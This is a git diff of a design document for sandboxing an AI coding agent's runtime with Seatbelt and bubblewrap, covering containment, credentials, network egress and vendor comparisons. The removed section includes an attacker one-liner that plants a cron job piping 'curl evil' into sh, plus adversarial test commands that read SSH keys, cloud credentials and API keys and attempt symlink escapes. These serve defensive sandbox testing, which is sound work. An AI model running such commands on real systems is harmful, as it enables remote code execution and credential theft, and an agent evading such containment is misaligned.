@@ -1,309 +1,115 @@
-# BW-031 — Sandbox Adapter: Implementation Proposal
+# BW-031 Docker-free execution feasibility
 
-**Status:** proposal, not implemented. No code in this document exists yet.
-**Author:** alpha-stabilisation increment, 2026-11-23.
-**Task:** BW-031 "Docker sandbox adapter" (P1, L), with BW-032 as its adversarial test suite.
-**Decision required before implementation:** which backend is the default, and whether Docker
-remains in scope at all.
+**Decision date** 2026-11-24. **Status** Approved direction with a tested offline macOS probe milestone. BW-031
+and BW-032 remain In progress. The previously reviewed Docker design is retained in Git history at `989cc82`.
+The integration target is OpenCode v2.3.2 at
+`c0ad18b402eb2827fc1ee71c171b1177b3fc02d1`, with the existing BW-018/BW-030 foundation.
 
----
+## Decision
 
-## 1. Why this is the release blocker
+Make native isolation the preferred path for `cd /path/to/project && bashwink`. Use
+a fresh workload containing the **OpenCode server, CLI/TUI, and descendants**. Keep
+policy compilation, the physical terminal boundary, credentials, evidence receipts
+and export on the host. Start with offline runtime qualification, then qualify a
+narrow provider transport. Keep Docker behind explicit selection as an optional
+adapter. Require separate approval before entering permission-controlled local mode.
 
-BW-059 fences **file tools**. It does not contain `shell`. Every verified claim about the fence
-says so, and `KNOWN_LIMITATIONS.md` §1 leads with it.
-
-The concrete hole, stated as an attacker would use it:
-
-```bash
-# Passes every BW-059 check: no path argument looks outside the fence.
-python3 -c "open('/etc/cron.d/x','w').write('* * * * * curl evil|sh')"
-```
-
-`shellPathTokens` sees no outside path. `workdir` is in scope. The write happens inside the
-interpreter, where a policy that inspects command strings cannot see it. Every permitted shell
-call is recorded as `unconstrained` — which is honest, but an audit entry written after the fact
-is not a boundary.
-
-**Therefore:** for a supervised internal alpha, the documented guardrail is defensible. For an
-external alpha, it is not, and no amount of additional string inspection makes it so. The fix
-must be enforced by the operating system below the interpreter, not by Bashwink above it.
-
-## 2. What already exists — do not build a custom sandbox
-
-Both serious implementations in this space converged on the same two OS primitives, and both
-stopped maintaining a Docker-first story. That is the strongest available evidence about what to
-build on.
-
-| Project | macOS | Linux | Notes |
-| --- | --- | --- | --- |
-| Claude Code (`sandbox-runtime`, `@anthropic-ai/sandbox-runtime`) | Seatbelt (`sandbox-exec`) | bubblewrap + socat | Same engine for the per-command sandbox and for wrapping the whole session. Explicitly excludes native Windows. |
-| Zed editor | Seatbelt | bubblewrap (non-setuid only) | Refuses a setuid-root `bwrap`, because a setuid binary would run root-privileged setup with arguments partly derived from model-influenced input. |
-| OpenCode / Bashwink | none | none | The gap this proposal closes. |
-
-**The relevant lesson from Zed's write-up:** it refuses setuid `bwrap` specifically because the
-setup arguments are model-influenced. Any adapter we write must use the unprivileged
-user-namespace path only.
-
-**Docker is the wrong default here**, and the task title says "Docker sandbox adapter". Reasons,
-in order of weight:
-
-1. **Startup cost.** A container per tool call is seconds; a container per session breaks the
-   interactive loop. Both reference implementations chose in-process OS isolation for this reason.
-2. **Path semantics.** Bind-mounting the workspace changes inode identity, which breaks file
-   watchers, `git` worktrees with absolute paths, and hardlink-based tooling. Seatbelt and
-   bubblewrap leave paths identical to the host.
-3. **Availability.** Docker requires a daemon and a licence decision for some users; `sandbox-exec`
-   ships with macOS, `bwrap` is a small distro package.
-4. **It is not more secure for this threat model.** The threat is an agent escaping a directory
-   fence, not a hostile kernel exploit. Container isolation is stronger against the latter and
-   largely irrelevant to the former.
-
-**Recommendation:** implement BW-031 as a **Seatbelt (macOS) + bubblewrap (Linux) adapter**, and
-keep a container backend as an optional third mode for users who already run one. This is a
-deliberate departure from the task title's "Docker" wording, and it needs sign-off rather than a
-silent reinterpretation.
-
-## 3. Feasibility — verified on this machine, not assumed
-
-macOS 27.0.1, `/usr/bin/sandbox-exec` present. A profile denying all writes and all network,
-with one workspace exception, was executed against real shells:
-
-```
-profile: (allow default)(deny file-write*)(allow file-write* (subpath "<realpath>"))(deny network*)
-
-in-scope write          -> WROTE_IN_SCOPE          (succeeded)
-new file in scope       -> NEW_OK                  (succeeded)
-write outside scope     -> "Operation not permitted" (file absent)
-read of /etc/hosts      -> READ_BLOCKED
-curl https://example.com-> NET_BLOCKED
-```
-
-**One trap found and proven, which would have silently broken every sandboxed write:** on macOS
-`/tmp` is a symlink to `/private/tmp`, and Seatbelt evaluates the **resolved** path. A profile
-allowing `(subpath "/tmp/repo")` denied writes to `/tmp/repo` — the exact failure mode where a
-sandbox appears to work but blocks the agent's legitimate work. The same class of containment
-decision BW-059 already makes (`realpath` of the deepest existing ancestor) must be reused to
-build these profiles.
-
-**Not yet verified:** `bwrap` behaviour on this machine (no Linux host available). The Linux
-adapter must be developed against CI's `ubuntu-latest`, where it can be exercised for real, and
-its tests must be skipped — visibly, not silently passed — on macOS.
-
-## 4. Proposed architecture
-
-One new module, `packages/bw-evidence/src/sandbox.ts`, plus wiring at the existing single
-enforcement point.
-
-**The key design constraint: do not create a second policy engine.** BW-059 already computes the
-verdict (allow/deny, with rule and target) for every tool call. The sandbox must *consume* that
-same `ScopePolicy`, not re-derive it. Two independent notions of "in scope" would drift, and the
-one that drifts is always the one nobody tested.
-
-### 4.1 Two enforcement layers, one policy
-
-```
-                     ScopePolicy (one source of truth)
-                            │
-        ┌───────────────────┴───────────────────┐
-        │                                       │
-  Layer 1: pre-execution                 Layer 2: OS sandbox
-  (BW-059, exists today)                 (BW-031, this proposal)
-  refuses obvious violations,            confines everything the tool
-  records `denied` entries               actually executes
-```
-
-Layer 1 gives a **useful error** ("this path is outside your scope") before anything runs.
-Layer 2 gives an **actual boundary** when Layer 1 cannot decide — which is precisely the shell
-case. Neither is sufficient alone: Layer 2 alone produces opaque `EPERM`s that a model retries
-forever; Layer 1 alone is advisory for shell.
-
-### 4.2 How the sandbox wraps execution
-
-Bashwink must not become a second runtime. Two candidate integration points, in order of
-preference:
-
-**Option A — wrap the runtime process (recommended for alpha).**
-Launch the whole OpenCode child under the sandbox:
-
-```bash
-# macOS
-sandbox-exec -f "$profilePath" "$OPENCODE_BIN" ...
-# Linux
-bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp \
-      --bind "$WORKSPACE" "$WORKSPACE" \
-      --unshare-pid --unshare-ipc --unshare-uts --unshare-net --die-with-parent \
-      --chdir "$WORKSPACE" "$OPENCODE_BIN" ...
-```
-
-This confines the agent **and** the runtime's own plugin host with no per-call plumbing, and it is
-the smallest possible change to Bashwink: one `spawn` argument list. Zed and Anthropic's runner
-both do the whole-process form for the same reason.
-
-Its cost: the runtime cannot reach its own state directory unless that is bound too, and a
-network-denied profile cannot reach the model provider — so the model API host must be allowed
-explicitly (see 4.4). Get this wrong and the symptom is "the model stopped working", not "the
-sandbox blocked it".
-
-**Option B — wrap each shell call (later, if A proves too coarse).**
-Route `shell` through a sandboxed wrapper. Finer-grained, and allows per-call profiles, but it
-requires the plugin's `execute.before` to rewrite the tool input, which changes what the model
-asked for — and the evidence chain must then record both the original and the rewritten command.
-More invasive; defer.
-
-**Recommendation:** Option A for BW-031.
-
-### 4.3 Generated Seatbelt profile
-
-```scheme
-(version 1)
-(allow default)
-;; writes: only the workspace, resolved physically at generation time
-(deny file-write*)
-(allow file-write* (subpath "<realpath(workspace)>"))
-(allow file-write* (subpath "/private/tmp"))        ;; TMPDIR; required by most toolchains
-(allow file-write* (subpath "<realpath(data-dir)>")) ;; evidence log, run records, SQLite
-;; reads: credentials are denied even though they are readable in principle
-(deny file-read* (subpath "<home>/.ssh"))
-(deny file-read* (subpath "<home>/.aws"))
-(deny file-read* (subpath "<home>/.config/gh"))
-(deny file-read* (literal "<home>/.netrc"))
-(deny file-read* (subpath "<home>/.hermes"))        ;; holds Bashwink's own provider keys
-;; network: deny by default, allow only the configured provider host
-(deny network*)
-(allow network-outbound (remote ip "api.example.com:443"))
-```
-
-Three things worth flagging:
-
-- **`(allow default)` first, then deny.** Seatbelt is last-match-wins, so order matters and a
-  profile that reads top-down as "deny everything then allow some" produces the opposite of the
-  intent if the denies are placed first. The profile above is ordered deliberately and must be
-  tested, not reasoned about.
-- **`/private/tmp` is allowed** because compilers, `pip`, and test runners require a writable temp
-  dir. That is a real hole (a model can write there), and it is the same hole the reference
-  implementations accept. It should be a tmpfs in Option A's container variant, and it must be
-  disclosed as a limit either way.
-- **The provider host must be allowed**, and the host list should come from the resolved
-  `baseURL` of the active provider, not be hardcoded.
-
-### 4.4 Linux profile (bubblewrap)
-
-```bash
---ro-bind / /                     # whole filesystem readable
---dev /dev --proc /proc
---tmpfs /tmp                      # private tmp
---bind "$WORKSPACE" "$WORKSPACE"  # the one writable path
---ro-bind "$DATA" "$DATA"         # evidence: readable, not writable by the agent
---unshare-pid --unshare-ipc --unshare-uts
---die-with-parent
---chdir "$WORKSPACE"
-# network: --unshare-net, or a proxy that allowlists the provider host
-```
-
-**Constraint discovered in the reference docs:** filesystem restrictions are decided at sandbox
-creation, so an agent given a non-Git directory can create `.git` inside it. That is acceptable
-(the workspace is writable by design) but must be understood: the sandbox bounds *where*, not
-*what*.
-
-`--unshare-net` is all-or-nothing on Linux; host-specific egress needs a proxy. The reference
-implementations use an HTTP/HTTPS proxy for this, noting that tools ignoring proxy variables
-(`ssh`, raw sockets) will not work even when the host is allowed. For alpha, deny network by
-default and document that `bwrap` mode requires either a proxy or no network.
-
-### 4.5 Failure modes that must not fail open
-
-The single most important rule: **if the sandbox cannot be created, the run must not proceed with
-the fence as its only protection while claiming sandboxing.** Two acceptable behaviours, chosen by
-an explicit config value rather than a default that surprises someone:
-
-| Config | Sandbox unavailable | Behaviour |
+| Option | Filesystem and process boundary | Trade-offs and fit |
 | --- | --- | --- |
-| `sandbox = "require"` (default for external alpha) | exit nonzero | Refuse to start; print the missing dependency and how to install it. |
-| `sandbox = "auto"` | warn loudly | Continue with BW-059 only; the run record and the evidence log carry `sandbox=unavailable`; `doctor` reports a warning. |
-| `sandbox = "off"` | n/a | Current behaviour; recorded as `sandbox=off`. |
+| Native macOS | Seatbelt policy over both OpenCode processes and their children. Dedicated scratch and staged workspace. | No helper install for the first spike. Apple’s launcher/API is deprecated. Mach services, dynamic libraries, TTY behavior, link handling, network confinement and descendant cleanup need qualification on each supported OS. There is no Linux-style PID namespace. |
+| Native Linux | Bubblewrap constructs a minimal mount view and private user, mount, PID, IPC, UTS and network namespaces. A tested seccomp layer reduces syscall exposure. | No daemon or VM. Availability depends on the kernel, distro/AppArmor policy, architecture, filesystem and helper path. Private PID namespace gives a candidate workload-wide cleanup boundary. A namespace is no guarantee of CPU/memory quotas. |
+| Optional Docker | The same workload and export contract implemented by a configured engine, with independently verified mount, network and process policies. | Adds engine/image supply-chain, daemon or VM, startup and cleanup costs. Rootless operation and resource limits are configuration-dependent. Useful for explicit engine-backed workflows after independent qualification. |
+| Permission-controlled local | Direct host execution using BW-018 and BW-059. | Existing compatibility path. Requires explicit acknowledgment and risky-operation approval. Host filesystem, processes, network and credentials remain reachable by permitted programs. |
 
-Zed's documented behaviour is to fall back with a warning; Anthropic's is `failIfUnavailable`.
-Both are reasonable, which is why this is a config decision and not something to guess.
+## What upstream products demonstrate
 
-## 5. Negative tests (BW-032)
-
-Each of these must be a fixture that **fails loudly if the boundary is absent**, run on both
-platforms, and record the refusal cause. None of them may pass by being skipped silently.
-
-### Filesystem
-1. `echo x > /tmp/outside.txt` — write outside the workspace is refused.
-2. `python3 -c "open('/etc/passwd','a')"` — the interpreter form of the same escape; **this is the
-   test BW-059 cannot pass today**.
-3. `ln -s /etc evil && echo x > evil/hosts` — symlink escape from inside the workspace.
-4. `cd / && touch /root/x` — traversal via absolute path.
-5. Write to `$HOME/.bashrc` — refused; the home directory is not the workspace.
-6. Write inside the workspace **succeeds** — the control case. A sandbox that blocks everything is
-   not a passing sandbox.
-
-### Credentials and secrets
-7. `cat ~/.ssh/id_*` — refused.
-8. `cat ~/.aws/credentials` — refused.
-9. `cat ~/.hermes/.env` — refused; this is where Bashwink's own provider key lives.
-10. `env | grep -i api_key` — the key must not be in the sandboxed environment unless the provider
-    needs it, and if it is, it must be the provider's variable only.
-
-### Network
-11. `curl https://example.com` — blocked when network is denied.
-12. `curl https://<provider-host>` — **must succeed** in Option A, or no inference happens. This
-    test exists to catch the failure mode where the sandbox silently breaks the product.
-13. `curl` to a raw IP, bypassing DNS — blocked.
-14. A tool honouring `HTTP_PROXY` reaches an allowlisted host, and a non-allowlisted host is
-    refused (only where a proxy is configured).
-
-### Process and resources
-15. A forked grandchild cannot escape: `sh -c 'python3 -c "open(\"/tmp/x\",\"w\")"'` — still confined.
-16. `--die-with-parent`: killing Bashwink leaves no sandboxed children alive.
-17. Memory/CPU limits (container mode only; `bwrap` has no native quota) — a runaway loop is
-    killed, not left to consume the host.
-18. Cancellation mid-command leaves no partial sandbox and no orphan process.
-
-### Integrity of the record
-19. A denied attempt appears in the evidence chain with the sandbox as its stated cause, distinct
-    from a BW-059 `denied` entry — the two layers must be distinguishable when reading a run.
-20. A sandbox-creation failure is recorded as `sandbox=unavailable`, never omitted.
-21. With `sandbox = "require"` and no backend, the run exits nonzero **before** the runtime starts.
-
-## 6. Effort and sequencing
-
-| Step | Work | Estimate |
+| Product and source availability | Observed pattern and maturity | Transfer to Bashwink |
 | --- | --- | --- |
-| 1 | `sandbox.ts`: availability probe, profile generation from `ScopePolicy`, wrapped spawn | 1–2 d |
-| 2 | macOS Seatbelt adapter + tests against the traps found above | 1–2 d |
-| 3 | Linux bwrap adapter, developed on CI | 2–3 d |
-| 4 | BW-032 adversarial fixture suite (the 21 cases above) | 2–3 d |
-| 5 | Docs: which layer refuses what; update `KNOWN_LIMITATIONS.md` §1 | 0.5 d |
-| 6 | Provider-host allowlist derived from the resolved `baseURL` | 0.5 d |
+| OpenAI Codex CLI, Apache-2.0 source | Codex uses Seatbelt on macOS and Bubblewrap plus seccomp on Linux. Its source distinguishes command execution, sandbox configuration, network policy and host tool/integration surfaces. It documents user namespace failures, including Ubuntu configurations. | Reuse the separation of policy and approval and the Linux startup/cleanup approach. Qualify Bashwink’s whole-runtime boundary separately. [Security architecture](https://openai.com/index/inside-the-codex-sandbox/) · [Linux source](https://github.com/openai/codex/tree/598083ae586954aa11edc8e8224a33ea878445ed/codex-rs/linux-sandbox) · [License](https://github.com/openai/codex/blob/main/LICENSE) |
+| Claude Code and Anthropic Sandbox Runtime | Claude documents OS-level shell confinement and configurable startup refusal. Its separate Apache-2.0 Sandbox Runtime uses Seatbelt or Bubblewrap and contains platform-specific network proxy/bridge code. The published runtime is inspectable independently of the complete Claude Code product. | Evaluate policy and proxy designs. Treat defaults, dependencies and release support of any adopted revision as separate decisions. Wrapping the shell alone leaves OpenCode’s in-process file and plugin operations outside that boundary. [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing) · [Runtime source and license](https://github.com/anthropics/sandbox-runtime/tree/0bbebed0aa9a8e628dc4df8bc30293550a1988eb) · [Claude product terms](https://github.com/anthropics/claude-code/blob/main/LICENSE.md) |
+| GitHub Copilot CLI and Microsoft MXC | GitHub announced general availability of local sandboxing on 2026-10-07. Microsoft documents Seatbelt on macOS and Bubblewrap on Linux. Copilot’s built-in file tools are evaluated by its harness outside the child-process OS sandbox. MXC is MIT; Copilot CLI has separate proprietary terms. | Evaluate MXC as an optional implementation dependency after compatibility and lifecycle trials. Its adoption by Copilot is useful production evidence for the primitives. Bashwink requires a separate boundary test for every OpenCode execution path. [GA announcement](https://github.blog/changelog/2026-10-07-local-sandboxing-for-github-copilot-now-generally-available/) · [Copilot architecture](https://commandline.microsoft.com/local-models-sandboxed-tools-github-windows/) · [Pinned MXC implementation](https://github.com/microsoft/mxc/blob/5c331f2f6c3b09fee8cb9f2e5c68df4596455957/src/mxc-sdk/src/backends/bubblewrap/common/bwrap_runner.rs) · [MXC license](https://github.com/microsoft/mxc/blob/main/LICENSE.md) · [Copilot CLI license](https://github.com/github/copilot-cli/blob/main/LICENSE.md) |
+| Gemini CLI, Apache-2.0 source | Gemini offers whole-process Seatbelt/container launch and a separate opt-in native tool sandbox. Its v0.70.0 tool factory selects Linux Bubblewrap/seccomp or macOS Seatbelt managers. Whole-CLI profiles vary in read and network access. | Whole-CLI wrapping is a relevant compatibility precedent. A permissive profile or a host workspace mount does not meet Bashwink’s credential and import requirements. [Sandbox methods](https://geminicli.com/docs/cli/sandbox/) · [Launcher source](https://github.com/google-gemini/gemini-cli/blob/v0.70.0/packages/cli/src/utils/sandbox.ts) · [Tagged tool factory](https://raw.githubusercontent.com/google-gemini/gemini-cli/v0.70.0/packages/core/src/services/sandboxManagerFactory.ts) · [License](https://github.com/google-gemini/gemini-cli/blob/main/LICENSE) |
+| OpenCode, MIT source | OpenCode documents permissions, hard-deny policies, plugins and local/remote MCP. The pinned implementation has in-process file tools, a shell hook, a managed-service connection path and a leased standalone server path. | Retain the pinned runtime and native policy hooks for defense in depth. Keep tool dispatch and model orchestration upstream. Host service discovery, unapproved integrations and host-backed invocation paths remain excluded from native admission. [Policies](https://opencode.ai/docs/policies/) · [Security scope](https://github.com/anomalyco/opencode/security) · [MCP](https://opencode.ai/docs/mcp-servers) · [Pinned source and license](https://github.com/anomalyco/opencode/tree/c0ad18b402eb2827fc1ee71c171b1177b3fc02d1) |
 
-Roughly **7–12 days**, excluding the container backend, which is a separate ~3 days and should be
-deferred until the two OS backends are proven.
+This review uses public source and documentation as design evidence. A license on a
+helper does not cover the consuming product. Any shared code must be selected at an
+exact revision and audited with its patches, transitive dependencies and distribution
+terms. Product maturity and kernel enforcement in a different application do not
+qualify Bashwink’s security or compatibility.
 
-## 7. What this does not solve
+## macOS recommendation
 
-Stated here so the proposal is not read as a security guarantee:
+Use the OS-provided `/usr/bin/sandbox-exec` for an initial Seatbelt spike with a
+default-deny, generated policy. Grant explicit read access to the pinned executable,
+loader, tested system/toolchain paths and staged inputs. Limit writes to private
+scratch and the authorized workspace staging area. Deny general network access,
+Apple Events, LaunchServices, unneeded Mach/XPC services, sensitive home paths, host sockets and privileged launch
+paths. Admit only required TTY and private transport capabilities. Keep shell and
+children in the same profile. Resolve capabilities with positive and negative
+functional probes, including child coverage and cleanup. Treat TCC and App Sandbox
+entitlements as separate mechanisms.
 
-- **Hostile code is still hostile.** Both backends isolate a process, not a kernel. The Arch wiki
-  says it plainly: sandboxing cannot make running untrusted code safe.
-- **`/private/tmp` remains writable** in the OS backends, because toolchains need it.
-- **Network allowlisting is host-based**, so a compromised allowlisted host is a path out.
-- **The evidence chain is still truncatable** (see `KNOWN_LIMITATIONS.md` §5) — an agent that can
-  write `$DATA` can rewrite its own record. The Linux profile makes `$DATA` read-only; the
-  Seatbelt profile must do the same and this must be a test, not an intention.
-- **Windows remains unsupported** and untested.
+Seatbelt enforcement is a kernel mechanism. The command-line launcher is deprecated
+in the shipped manual, and programmatic `sandbox_init` is also deprecated. A helper
+that invokes it directly still carries that compatibility risk. Apple’s presence of
+a binary or API does not establish future availability or the stability of profile
+rules. Test on every advertised macOS release and architecture with signed packaged
+binaries. Mark a host unsupported if the profile, provider transport or lifecycle
+cannot be qualified. In particular, a process group proves only group cleanup.
+Cancellation, timeout and launcher death must cover detached descendants separately
+before claiming workload cleanup on macOS.
+[MXC Seatbelt implementation notes](https://github.com/microsoft/mxc/blob/main/docs/backends/seatbelt/seatbelt-backend.md)
+· [Apple App Sandbox](https://developer.apple.com/documentation/security/app-sandbox)
+· [Apple helper entitlements](https://developer.apple.com/documentation/xcode/embedding-a-helper-tool-in-a-sandboxed-app).
 
-## 8. Decision requested
+## Linux recommendation and packaging
 
-1. Approve **Seatbelt + bubblewrap as the BW-031 backends**, departing from the task title's
-   "Docker" wording — or reject and require a container-first design.
-2. Choose the default for `sandbox`: `require` (refuse to start without a backend) or `auto`
-   (warn and continue). The first is right for an external alpha; the second is friendlier for
-   the internal one.
-3. Confirm option A (wrap the whole runtime process) over per-call wrapping.
+Select an unprivileged, security-patched Bubblewrap build at a trusted absolute path.
+Prefer a distribution-managed dependency and its approved AppArmor profile for the
+first packages. Never resolve helpers through the project PATH. Start with an
+explicit minimal filesystem and fresh privately mounted scratch, a private PID
+namespace with a reaper, no elevated caps, no-new-privileges and a private network
+namespace. Add a narrowly scoped seccomp policy for each supported ABI after
+testing normal runtime behavior. Seccomp reduces syscall surface; filesystem access
+is enforced by the mount view and its writable paths. Avoid setuid helpers and
+system-wide changes to namespace restrictions. Check both the running kernel policy
+and the selected helper by launching a disposable workload. Set and verify wall time
+and any advertised cgroup limits independently.
 
-Until 1–3 are decided and implemented, the external-alpha verdict stays **FAIL**, and the honest
-statement remains the one in `KNOWN_LIMITATIONS.md`: a guardrail, not a sandbox.
+Bubblewrap v0.12 dropped setuid support and switched the project license to
+LGPL-2.1-or-later. The v0.13.1 upstream release at `362936aea0d5c6e70f7af75d2d44b5a914cb4ba2` is a review candidate, subject to
+distro security patches and pinned package provenance. A generic bundled executable
+may still fail AppArmor policy even when the distro package works. If bundling is
+needed, ship separate signed builds for tested architectures and ABIs, with exact
+source and patches, build instructions, notices, SBOM and tested runtime dependencies.
+Review the applicable redistribution obligations for each artifact and helper.
+Bubblewrap needs libcap and can link libselinux. Review platform libc and dependency packaging. Build-time seccomp filter generation can avoid a runtime libseccomp dependency. Review it independently if linked or shipped. The initial design
+requires no `socat`, `slirp4netns`, Docker socket or privileged daemon. A later network
+bridge changes the required dependency and threat review.
+[Bubblewrap v0.12](https://github.com/containers/bubblewrap/releases/tag/v0.12.0)
+· [Bubblewrap v0.13.1](https://github.com/containers/bubblewrap/releases/tag/v0.13.1) · [Native build dependencies](https://github.com/containers/bubblewrap/blob/v0.13.1/meson.build)
+· [Ubuntu AppArmor restrictions](https://documentation.ubuntu.com/security/security-features/privilege-restriction/apparmor/)
+· [Linux seccomp documentation](https://docs.kernel.org/userspace-api/seccomp_filter.html).
+
+## Integration and security boundary
+
+| Surface | Required disposition |
+| --- | --- |
+| Built-in file tools, tool hooks and shell | Contain the whole runtime. Preserve BW-018 approvals and ScopeFence. A recognized file write also hits the operating system boundary. Path authorization must survive actual filesystem access and descendants. |
+| TUI and client plugins | Launch the TUI in the same policy boundary, with host-owned terminal mediation. An explicit server connection can still load client plugins from local paths or server inventory. Use generated config and an explicit first-party plugin set. Disable project/global plugin discovery and automatic installation in native mode. Validate terminal control sequences, resize and interactive approval. |
+| Local MCP, subagents and processes | Disable MCP initially. Future local MCP children must start within the same or stricter boundary. A host or remote MCP service performs effects outside it and needs separate admission, policy and user disclosure. |
+| Managed OpenCode and background work | Refuse external attach, service discovery, raw terminal APIs, unscoped worktrees, automation and host-side delegation. Start the pinned leased server inside the workload. Stdio advertises an HTTP endpoint and carries the lifetime lease. The client and admission endpoint can use private workload loopback; any host-facing route needs an explicit mediated channel. Bind the verified workspace and boot identity to actual contained runtime and policy. Gate the first prompt and monitor loss of readiness. |
+| Provider inference and OAuth | Resolve authentication on the host. Expose a protocol-specific quota-limited relay via a private channel, with narrowly allowed provider operations, fixed destination/TLS and no general forwarding. Handle login or browser callbacks on the host. An admitted tool that can reach the relay may consume its run quota until caller separation is proven. Provider endpoint incompatibility stops the selected mode. |
+| Credentials, Git, sessions and evidence | Give the workload a synthetic home and clean XDG roots, generated config and its own state. Never copy an existing OpenCode SQLite database wholesale: it can hold credentials and scheduled work. Keep raw provider credentials, SSH/cloud material, agent/keychain sockets, ambient environment and host evidence outside. Keep session state per workspace and backend. Validate and quarantine any persisted/exported state. Treat guest evidence as telemetry. The host records policy identity, exit and cleanup separately. |
+| Host outputs | Review staged changes, restrict export by approved paths and base identity, and check for conflicts before applying. Keep the normal coding loop inside the staged project. Test Git, preview/application and resume before claiming existing checkout semantics. |
+
+The supported hybrid is **whole-runtime confinement plus narrowly mediated host
+services**. Tool-only sandboxing leaves in-process file operations and plugins
+dependent on harness checks. Sandboxing just the client can allow a managed host
+server to execute prompts and tools. Host provider and export services are outside
+the OS sandbox and form part of the trusted computing base. No kernel-exploit,
+administrator-resistance, side-channel, provider-data-confidentiality or arbitrary
+third-party integration guarantee is proposed. Native builds must demonstrate actual
+filesystem denial, network restrictions and cleanup before those capabilities are
+displayed. See [implementation plan](BW-031_IMPLEMENTATION_PLAN.md) and
+[qualification requirements](BW-032_PLATFORM_QUALIFICATION.md).
